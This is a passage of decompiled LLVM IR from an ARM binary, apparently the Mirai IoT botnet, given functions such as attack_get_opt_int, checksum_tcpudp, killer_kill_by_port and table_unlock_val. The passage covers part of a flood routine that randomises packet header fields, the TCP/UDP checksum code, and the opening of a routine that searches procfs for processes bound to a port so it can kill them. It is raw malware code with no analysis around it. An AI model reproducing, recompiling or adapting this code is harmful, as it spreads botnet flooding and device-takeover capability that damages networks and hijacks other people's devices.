  %v9_c768 = icmp eq i32 %v1_c764, %v1_c768
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v5_c770 = icmp slt i32 %v1_c764, %v1_c768
  br i1 %v5_c770, label %dec_label_pc_c678, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v1_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c788:                                ; preds = %dec_label_pc_c678
  %v1_c788 = add i32 %v2_c680, 16
  %v2_c788 = inttoptr i32 %v1_c788 to i32*
  %v3_c788 = load i32, i32* %v2_c788, align 4
  store i32 %v3_c788, i32* %r4.global-to-local, align 4
  %v0_c78c = call i32 @rand_next()
  store i32 %v0_c78c, i32* %r0.global-to-local, align 4
  %v3_c790 = load i32, i32* %stack_var_-44, align 4
  %v5_c798 = mul i32 %v3_c790, 24
  %v0_c79c = load i32, i32* %r4.global-to-local, align 4
  %v1_c79c = and i32 %v0_c79c, 16711680
  %v3_c7a0 = udiv i32 %v0_c79c, 16777216
  %v4_c7a4 = udiv i32 %v1_c79c, 256
  %v5_c7a4 = or i32 %v4_c7a4, %v3_c7a0
  store i32 %v5_c7a4, i32* %r2.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r8, align 4
  %v2_c7a8 = add i32 %v1_c7a8, %v5_c798
  store i32 %v2_c7a8, i32* %r1.global-to-local, align 4
  %v1_c7ac = and i32 %v0_c79c, 65280
  store i32 %v1_c7ac, i32* %r3.global-to-local, align 4
  %v1_c7b0 = add i32 %v2_c7a8, 20
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i8*
  %v3_c7b0 = load i8, i8* %v2_c7b0, align 1
  %v4_c7b0 = zext i8 %v3_c7b0 to i32
  %v5_c7b8 = call i32 @llvm.bswap.i32(i32 %v0_c79c)
  %v7_c7bc = lshr i32 %v0_c78c, %v4_c7b0
  %v8_c7bc = add i32 %v7_c7bc, %v5_c7b8
  store i32 %v8_c7bc, i32* %r2.global-to-local, align 4
  %v1_c7c0 = and i32 %v8_c7bc, 16711680
  store i32 %v1_c7c0, i32* %r0.global-to-local, align 4
  %v1_c7cc = and i32 %v8_c7bc, 65280
  store i32 %v1_c7cc, i32* %r1.global-to-local, align 4
  %v5_c7d4 = call i32 @llvm.bswap.i32(i32 %v8_c7bc)
  %v1_c7d8 = load i32, i32* @r5, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 16
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v5_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  %v0_c7e8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7f0 = load i32, i32* @r5, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 12
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7f8 = add i32 %v0_c7f8, -1
  store i32 %v1_c7f8, i32* @r4, align 4
  %v9_c7fc = icmp eq i32 %v3_c3f4, %v1_c7f8
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7fc, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v0_c804 = call i32 @rand_next()
  %v1_c804 = trunc i32 %v0_c804 to i16
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v3_c3f8, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  %v3_c810 = load i32, i32* @r5, align 4
  %v4_c810 = add i32 %v3_c810, 4
  %v5_c810 = inttoptr i32 %v4_c810 to i16*
  store i16 %v1_c804, i16* %v5_c810, align 2
  br i1 %v9_c80c, label %dec_label_pc_c818, label %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge

dec_label_pc_c804.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c804
  %v1_c6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c818:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c6b8
  %v0_c818 = call i32 @rand_next()
  %v1_c818 = trunc i32 %v0_c818 to i16
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v1_c820 = load i32, i32* @r4, align 4
  %v9_c820 = icmp eq i32 %v3_c3fc, %v1_c820
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  %v3_c824 = load i32, i32* @r5, align 4
  %v4_c824 = add i32 %v3_c824, 20
  %v5_c824 = inttoptr i32 %v4_c824 to i16*
  store i16 %v1_c818, i16* %v5_c824, align 2
  br i1 %v9_c820, label %dec_label_pc_c82c, label %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge

dec_label_pc_c818.dec_label_pc_c6d0_crit_edge:    ; preds = %dec_label_pc_c818
  %v1_c6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c6c4
  %v0_c82c = call i32 @rand_next()
  %v1_c82c = trunc i32 %v0_c82c to i16
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v1_c834 = load i32, i32* @r4, align 4
  %v9_c834 = icmp eq i32 %v5_c2c8, %v1_c834
  store i1 %v9_c834, i1* %cpsr_z.global-to-local, align 1
  %v3_c838 = load i32, i32* @r6, align 4
  %v4_c838 = add i32 %v3_c838, 2
  %v5_c838 = inttoptr i32 %v4_c838 to i16*
  store i16 %v1_c82c, i16* %v5_c838, align 2
  br i1 %v9_c834, label %dec_label_pc_c840, label %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge

dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge:    ; preds = %dec_label_pc_c82c
  %v1_c6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c840:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c6d0
  %v0_c840 = call i32 @rand_next()
  %v1_c844 = load i32, i32* @r6, align 4
  %v2_c844 = add i32 %v1_c844, 4
  %v3_c844 = inttoptr i32 %v2_c844 to i32*
  store i32 %v0_c840, i32* %v3_c844, align 4
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v1_c84c = load i32, i32* @r4, align 4
  %v9_c84c = icmp eq i32 %v6_c2e0, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c854:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c854 = call i32 @rand_next()
  store i32 %v0_c854, i32* %r0.global-to-local, align 4
  %v0_c858 = load i32, i32* @fp, align 4
  %v2_c858 = icmp eq i32 %v0_c858, 0
  store i1 %v2_c858, i1* %cpsr_z.global-to-local, align 1
  %v1_c85c = load i32, i32* @r6, align 4
  %v2_c85c = add i32 %v1_c85c, 8
  %v3_c85c = inttoptr i32 %v2_c85c to i32*
  store i32 %v0_c854, i32* %v3_c85c, align 4
  br i1 %v2_c858, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854
  %v0_c864 = call i32 @rand_next()
  %v1_c864 = trunc i32 %v0_c864 to i16
  store i32 %v0_c864, i32* %r0.global-to-local, align 4
  %v3_c868 = load i32, i32* @r6, align 4
  %v4_c868 = add i32 %v3_c868, 18
  %v5_c868 = inttoptr i32 %v4_c868 to i16*
  store i16 %v1_c864, i16* %v5_c868, align 2
  br label %dec_label_pc_c6f0

dec_label_pc_c870:                                ; preds = %dec_label_pc_c3b0
  %v0_c870 = load i32, i32* @sl, align 4
  store i32 %v0_c870, i32* %r0.global-to-local, align 4
  %v1_c874 = call i32 @__GI___libc_close(i32 %v0_c870)
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %entry, %dec_label_pc_c870
  %v1_c880 = phi i32 [ %v3_c3a0, %entry ], [ %v1_c874, %dec_label_pc_c870 ]
  store i32 %v3_c1dc, i32* %r4.global-to-local, align 4
  store i32 %v24_c1dc, i32* %fp.global-to-local, align 4
  store i32 %v27_c1dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c880

; uselistorder directives
  uselistorder i32 %v0_c864, { 1, 0 }
  uselistorder i32 %v0_c82c, { 1, 0 }
  uselistorder i32 %v0_c818, { 1, 0 }
  uselistorder i32 %v0_c804, { 1, 0 }
  uselistorder i32 %v1_c7f8, { 1, 2, 0 }
  uselistorder i32 %v0_c79c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c730, { 1, 0 }
  uselistorder i32 %v4_c720, { 1, 0 }
  uselistorder i1 %v3_c6b0, { 1, 0 }
  uselistorder i32 %v2_c654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c4bc, { 1, 2, 0 }
  uselistorder i32 %v1_c488, { 2, 1, 0 }
  uselistorder i32 %v1_c484, { 2, 0, 1 }
  uselistorder i32 %v1_c480, { 2, 0, 1 }
  uselistorder i32 %v1_c47c, { 2, 0, 1 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3e8, { 1, 0, 2 }
  uselistorder i32 %v0_c3e4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i1 %v7_c3a4, { 1, 0 }
  uselistorder i32 %v3_c3a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c38c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2c8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c24c, { 1, 0 }
  uselistorder i32 %v7_c234, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 101, 102, 103, 104, 105, 106, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 100, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c864, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8ac, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %entry
  %v0_c89c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898, %dec_label_pc_c894
  %v0_c8a4 = phi i32 [ %v2_c8a4, %dec_label_pc_c898 ], [ 0, %dec_label_pc_c894 ]
  %v0_c89c = phi i32 [ %v5_c89c, %dec_label_pc_c898 ], [ %v0_c89c.pre, %dec_label_pc_c894 ]
  %v0_c898 = phi i32 [ %v1_c898, %dec_label_pc_c898 ], [ %arg1, %dec_label_pc_c894 ]
  %v1_c898 = add i32 %v0_c898, -2
  %v1_c89c = inttoptr i32 %v0_c89c to i16*
  %v2_c89c = load i16, i16* %v1_c89c, align 2
  %v3_c89c = zext i16 %v2_c89c to i32
  %v5_c89c = add i32 %v0_c89c, -2
  store i32 %v5_c89c, i32* @r0, align 4
  %v2_c8a4 = add i32 %v3_c89c, %v0_c8a4
  %v1_c898.cmp = icmp ugt i32 %v1_c898, 1
  br i1 %v1_c898.cmp, label %dec_label_pc_c898, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c8ac.loopexit:                       ; preds = %dec_label_pc_c898
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %entry, %dec_label_pc_c8ac.loopexit
  %v1_c8b4 = phi i32 [ %v2_c8a4, %dec_label_pc_c8ac.loopexit ], [ 0, %entry ]
  %v0_c8ac = phi i32 [ %v1_c898, %dec_label_pc_c8ac.loopexit ], [ %arg1, %entry ]
  %v7_c8ac = icmp eq i32 %v0_c8ac, 1
  br i1 %v7_c8ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8ac
  %v1_c8b0 = load i32, i32* @r0, align 4
  %v2_c8b0 = inttoptr i32 %v1_c8b0 to i8*
  %v3_c8b0 = load i8, i8* %v2_c8b0, align 1
  %v4_c8b0 = zext i8 %v3_c8b0 to i32
  %v3_c8b4 = add i32 %v1_c8b4, %v4_c8b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8ac, %bb
  %v0_c8b8 = phi i32 [ %v1_c8b4, %dec_label_pc_c8ac ], [ %v3_c8b4, %bb ]
  %v3_c8bc = urem i32 %v0_c8b8, 65536
  %v4_c8c0 = udiv i32 %v0_c8b8, 65536
  %v5_c8c0 = add nuw nsw i32 %v4_c8c0, %v3_c8bc
  %v4_c8c4 = udiv i32 %v5_c8c0, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v5_c8c0
  %v1_c8c8 = urem i32 %v5_c8c4, 65536
  %v3_c8d0 = xor i32 %v1_c8c8, 65535
  ret i32 %v3_c8d0

; uselistorder directives
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v5_c89c, { 1, 0 }
  uselistorder i32 %v1_c898, { 1, 0, 2 }
  uselistorder i32 %v0_c89c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8e8 = add i32 %arg1, 12
  %v2_c8e8 = inttoptr i32 %v1_c8e8 to i32*
  %v3_c8e8 = load i32, i32* %v2_c8e8, align 4
  %v1_c8ec = add i32 %arg1, 16
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v7_c8f0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f0, label %dec_label_pc_c8fc.preheader, label %dec_label_pc_c910

dec_label_pc_c8fc.preheader:                      ; preds = %entry
  %v0_c900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8fc
  %v0_c908 = phi i32 [ 0, %dec_label_pc_c8fc.preheader ], [ %v2_c908, %dec_label_pc_c8fc ]
  %v0_c900 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v5_c900, %dec_label_pc_c8fc ]
  %v0_c8fc = phi i32 [ %arg3, %dec_label_pc_c8fc.preheader ], [ %v1_c8fc, %dec_label_pc_c8fc ]
  %v1_c8fc = add nsw i32 %v0_c8fc, -2
  %v1_c900 = inttoptr i32 %v0_c900 to i16*
  %v2_c900 = load i16, i16* %v1_c900, align 2
  %v3_c900 = zext i16 %v2_c900 to i32
  %v5_c900 = add i32 %v0_c900, -2
  store i32 %v5_c900, i32* @r1, align 4
  %v2_c908 = add i32 %v3_c900, %v0_c908
  %v8_c90c = icmp sgt i32 %v1_c8fc, 1
  br i1 %v8_c90c, label %dec_label_pc_c8fc, label %dec_label_pc_c910.loopexit

dec_label_pc_c910.loopexit:                       ; preds = %dec_label_pc_c8fc
  br label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c910.loopexit, %entry
  %v1_c91c = phi i32 [ %v2_c908, %dec_label_pc_c910.loopexit ], [ 0, %entry ]
  %v0_c910 = phi i32 [ %v1_c8fc, %dec_label_pc_c910.loopexit ], [ %arg3, %entry ]
  %v7_c910 = icmp eq i32 %v0_c910, 1
  br i1 %v7_c910, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c910
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c910
  %v1_c914 = load i32, i32* @r1, align 4
  %v2_c914 = inttoptr i32 %v1_c914 to i8*
  %v3_c914 = load i8, i8* %v2_c914, align 1
  %v4_c914 = zext i8 %v3_c914 to i32
  %v3_c91c = add i32 %v4_c914, %v1_c91c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c944 = phi i32 [ %v1_c91c, %.thread ], [ %v3_c91c, %bb ]
  %v0_c924 = mul i32 %v3_c8e8, 65536
  %v3_c924 = udiv i32 %v0_c924, 65536
  %v3_c928 = urem i32 %v3_c8ec, 65536
  %v4_c930 = udiv i32 %v3_c8e8, 65536
  %v2_c92c = add nuw nsw i32 %v3_c928, %v4_c930
  %v5_c930 = add nuw nsw i32 %v2_c92c, %v3_c924
  %v1_c934 = add i32 %arg1, 9
  %v2_c934 = inttoptr i32 %v1_c934 to i8*
  %v3_c934 = load i8, i8* %v2_c934, align 1
  %v4_c934 = zext i8 %v3_c934 to i32
  %v4_c938 = udiv i32 %v3_c8ec, 65536
  %v3_c940 = mul nuw nsw i32 %v4_c934, 256
  %v5_c938 = add i32 %v4_c938, %arg2
  %v2_c93c = add i32 %v5_c938, %v1_c944
  %v2_c944 = add i32 %v2_c93c, %v5_c930
  %v2_c948 = add i32 %v2_c944, %v3_c940
  %tmp = icmp ult i32 %v2_c948, 65536
  br i1 %tmp, label %dec_label_pc_c968, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb19, %dec_label_pc_c954
  %v2_c95c5 = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606.in = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606 = udiv i32 %v3_c9606.in, 65536
  %v3_c958 = urem i32 %v2_c95c5, 65536
  %v2_c95c = add nuw nsw i32 %v3_c958, %v3_c9606
  %tmp20 = icmp ult i32 %v2_c95c, 65536
  br i1 %tmp20, label %dec_label_pc_c968.loopexit, label %dec_label_pc_c954

dec_label_pc_c968.loopexit:                       ; preds = %dec_label_pc_c954
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c968.loopexit, %bb19
  %v0_c968 = phi i32 [ %v2_c95c, %dec_label_pc_c968.loopexit ], [ %v2_c948, %bb19 ]
  %v1_c968 = urem i32 %v0_c968, 65536
  %v3_c970 = xor i32 %v1_c968, 65535
  ret i32 %v3_c970

; uselistorder directives
  uselistorder i32 %v2_c95c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c948, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c91c, { 1, 0 }
  uselistorder i32 %v5_c900, { 1, 0 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v3_c8e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c97c = load i32, i32* @r4, align 4
  %v6_c97c = load i32, i32* @r5, align 4
  %v9_c97c = load i32, i32* @r6, align 4
  %v12_c97c = load i32, i32* @r7, align 4
  %v15_c97c = load i32, i32* @r8, align 4
  %v18_c97c = load i32, i32* @sb, align 4
  %v21_c97c = load i32, i32* @sl, align 4
  %v24_c97c = load i32, i32* @fp, align 4
  %v27_c97c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c998 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c998, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9c4 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9c4, i32* @fp, align 4
  %v4_c9d0 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_c9d4 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9d4, i32* @sl, align 4
  %v0_c9d8 = load i32, i32* @r5, align 4
  %v3_c9e4 = bitcast i32* %stack_var_-8777 to i8*
  %v4_c9e4 = call i32 @__GI_memset(i8* %v3_c9e4, i32 %v0_c9d8, i32 4096)
  %v0_c9ec = load i32, i32* @r5, align 4
  %v3_c9f8 = bitcast i32* %stack_var_-4681 to i8*
  %v4_c9f8 = call i32 @__GI_memset(i8* %v3_c9f8, i32 %v0_c9ec, i32 4096)
  %v2_c9fc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9fc, i32* @sb, align 4
  %v0_ca00 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca00 = udiv i32 %v0_ca00, 256
  %v1_ca04 = urem i32 %v0_ca00, 256
  store i32 %v1_ca04, i32* @r4, align 4
  %v3_ca14 = trunc i32 %v3_ca00 to i8
  %v4_ca14 = call i32 @util_itoa(i8 %v3_ca14, i32 16, i32 %v2_c9fc)
  %v2_ca1c = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca20 = icmp eq i32 %v2_ca1c, 2
  br i1 %v7_ca20, label %dec_label_pc_cee4, label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %entry, %dec_label_pc_cee4
  %v1_ca2c = call i32 @table_unlock_val(i32 13)
  %v1_ca34 = call i32 @table_unlock_val(i32 14)
  %v1_ca3c = call i32 @table_unlock_val(i32 15)
  %v1_ca44 = call i32 @table_unlock_val(i32 17)
  %v0_ca48 = load i32, i32* @r5, align 4
  %v2_ca50 = inttoptr i32 %v0_ca48 to i32*
  %v3_ca50 = call i32 @table_retrieve_val(i32 17, i32* %v2_ca50)
  %v0_ca54 = load i32, i32* @r5, align 4
  %v2_ca58 = call i32 @__libc_open(i32 %v3_ca50, i32 %v0_ca54)
  %v7_ca5c = icmp eq i32 %v2_ca58, -1
  store i32 %v2_ca58, i32* @r8, align 4
  br i1 %v7_ca5c, label %bb, label %dec_label_pc_ca6c.preheader

bb:                                               ; preds = %dec_label_pc_ca28
  %v1_ca64 = load i32, i32* @r5, align 4
  store i32 %v1_ca64, i32* @r4, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ca6c.preheader:                      ; preds = %dec_label_pc_ca28
  %v4_ca7856 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca58)
  %v2_ca7c58 = icmp eq i32 %v4_ca7856, 0
  br i1 %v2_ca7c58, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84.lr.ph

dec_label_pc_ca84.lr.ph:                          ; preds = %dec_label_pc_ca6c.preheader
  %v2_cacc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca84.lr.ph, %dec_label_pc_ca6c.backedge
  %v3_ca88 = load i8, i8* %stack_var_-585, align 1
  %v4_ca88 = sext i8 %v3_ca88 to i32
  store i32 %v4_ca88, i32* @r3, align 4
  %v2_ca8c = icmp eq i8 %v3_ca88, 0
  br i1 %v2_ca8c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca84
  %v8_ca90 = icmp eq i8 %v3_ca88, 58
  br i1 %v8_ca90, label %.thread8, label %dec_label_pc_caa4

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cabc

bb126:                                            ; preds = %dec_label_pc_ca84
  br label %dec_label_pc_cabc

dec_label_pc_caa4:                                ; preds = %bb125
  %v1_caac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %bb127, %dec_label_pc_caa4
  %v0_caa8 = phi i32 [ %v1_caa8, %bb127 ], [ 0, %dec_label_pc_caa4 ]
  %v1_caa8 = add i32 %v0_caa8, 1
  %v2_caac = add i32 %v1_caa8, %v1_caac.pre
  %v3_caac = inttoptr i32 %v2_caac to i8*
  %v4_caac = load i8, i8* %v3_caac, align 1
  %v6_caac = zext i8 %v4_caac to i32
  store i32 %v6_caac, i32* @r3, align 4
  %v2_cab0 = icmp eq i8 %v4_caac, 0
  br i1 %v2_cab0, label %dec_label_pc_cabc, label %bb127

bb127:                                            ; preds = %dec_label_pc_caa8
  %v8_cab4 = icmp eq i8 %v4_caac, 58
  br i1 %v8_cab4, label %dec_label_pc_cabc, label %dec_label_pc_caa8

dec_label_pc_cabc:                                ; preds = %dec_label_pc_caa8, %bb127, %bb126, %.thread8
  %v1_cae8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_caa8, %bb127 ], [ %v1_caa8, %dec_label_pc_caa8 ]
  %v0_cabc = phi i32 [ %v4_ca88, %.thread8 ], [ %v4_ca88, %bb126 ], [ %v6_caac, %bb127 ], [ %v6_caac, %dec_label_pc_caa8 ]
  %v2_cabc = icmp eq i32 %v0_cabc, 0
  br i1 %v2_cabc, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cac4

dec_label_pc_ca6c.backedge:                       ; preds = %dec_label_pc_cabc, %dec_label_pc_cb8c, %dec_label_pc_cbd8, %dec_label_pc_cb08
  %v0_ca74 = load i32, i32* @r8, align 4
  %v4_ca78 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca74)
  %v2_ca7c = icmp eq i32 %v4_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_cae8, 2
  %v2_cad0 = add i32 %v1_cac8, %v2_cacc
  %v1_cad4 = add i32 %v2_cad0, -545
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v2_cad8 = icmp eq i8 %v3_cad4, 0
  br i1 %v2_cad8, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_cac4
  %v8_cadc = icmp eq i8 %v3_cad4, 32
  br i1 %v8_cadc, label %.thread13, label %dec_label_pc_cae8

